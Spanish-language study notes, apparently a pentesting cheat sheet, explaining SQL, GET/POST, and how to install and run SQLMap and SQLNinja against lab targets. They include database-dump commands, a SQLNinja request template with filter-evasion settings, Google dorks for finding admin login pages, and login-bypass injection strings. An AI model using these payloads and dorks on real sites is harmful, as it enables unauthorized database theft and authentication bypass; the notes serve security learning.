# SQL

SQL (por sus siglas en inglés Structured Query Language; en español lenguaje de consulta estructurada) es un lenguaje específico del dominio que da acceso a un sistema de gestión de bases de datos relacionales que permite especificar diversos tipos de operaciones en ellos.

**Referencia**: [Wikipedia](https://es.wikipedia.org/wiki/SQL)

## Metodos GET y POST

Hay dos métodos de subir la información mediante las variables superglobales **GET** y **POST**.

Es importante recordar que **$_GET** y **$_POST** son arreglos que tienen posiciones asociativas, es decir, cada posición en el arreglo tiene un nombre, y ese nombre es el mismo que tiene cada campo del formulario.

* **GET**: en link de la página web se aprecia lo que se sube al formulario.
* **POST**: no se aprecia en el link lo que se le sube al formulario.

# SQLMap

SQLmap es una herramienta desarrollada en Python para realizar SQL Injection de forma automatizada. Con esto evitamos en cierta forma el trabajo de crear bypass o ingresar códigos sql para explotar los datos

#### Inslar SQLMap

```bash
sudo apt-get install python
git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

#### Iniciar SQLMap
```
python sqlmap.py -u http://localhost/pruebas/inyecciones.php?id=1
```

#### Comandos basicos:

* **--dbs** Nombre de Base de Datos.
* **--columns** Obtener Columnas.
* **--tables** Obtener Tablas.
* **--dmg** Volcar los datos de la tabla en particular, muy similar a la función que cumple el comando mysqldump.
* **--dump** Volcar los datos de la tabla en particular.

# SQLNinja

Sqlninja es una herramienta destinada a explotar las vulnerabilidades de inyección SQL en una aplicación web que utiliza Microsoft SQL Server como su back-end.

Su objetivo principal es proporcionar un acceso remoto en el servidor de base de datos vulnerable, incluso en un entorno muy hostil. Los verificadores de penetración deberían usarlo para ayudar y automatizar el proceso de hacerse cargo de un Servidor de base de datos cuando se descubrió una vulnerabilidad de inyección SQL.

**Referencia:** [Kali - SQLNinja](https://tools.kali.org/vulnerability-analysis/sqlninja) [Web - SQLNinja](http://sqlninja.sourceforge.net/)

#### Configurando SQLNinja

1. Ir a la carpeta donde está SQLNinja y ubicar el archivo sqlninja.conf
2. En la *linea 38* hay un ejemplo, se remplaza ese texto con el Request de Vega.
```sqlninja.conf
--httprequest_start-- 
GET https://172.16.223.128/checkid.asp?id=1;__SQL2INJECT__ HTTP/1.0
Host: 172.16.223.128
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*
Accept-Language: en-us,en;q=0.7,it;q=0.3
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close
--httprequest_end--
```
3. Colocar "__SQL2INJECT__" en el **Parametro** a inyectar.
4. Configurar los parametros de seguridad a partir de la **línea 105**
```sqlninja.conf
# Evasion techniques to be used. Possible choices are:
1 - Query hex-encoding
2 - Comments as separators
# 3 - Random case
4 - Random URI encoding
# All techniques can be combined, so the following is legal:
# evasion = 1234
# However, keep in mind that using too many techniques at once leads to very
# long queries, that might create problems when using GET. Default: no evasion
evasion = 124
``` 

**TIPS:**
* Para metodos **POST** debemos de usar el *https://* y borrar la linea de *Content Length*.

#### Ejecutar
```bash
sqlninja -m <modo> -f <directorio sqlninja.conf>
```

## Utilidades

**Ejemplos de Dorks:**

* inurl:adminlogin.aspx
* inurl:admin/index.php
* inurl:administrator.php
* inurl:administrator.asp
* inurl:login.asp
* inurl:login.aspx
* inurl:login.php
* inurl:admin/index.php
* inurl:adminlogin.aspx

**Algunas sentencias de ataque de vectores de mysql:**
```
User: 1'or'1'='1
Password: ' or 1=1--
```
**Ejemplo más utilizado**
```
http://localhost/pruebas/inyecciones.php?id=1
```

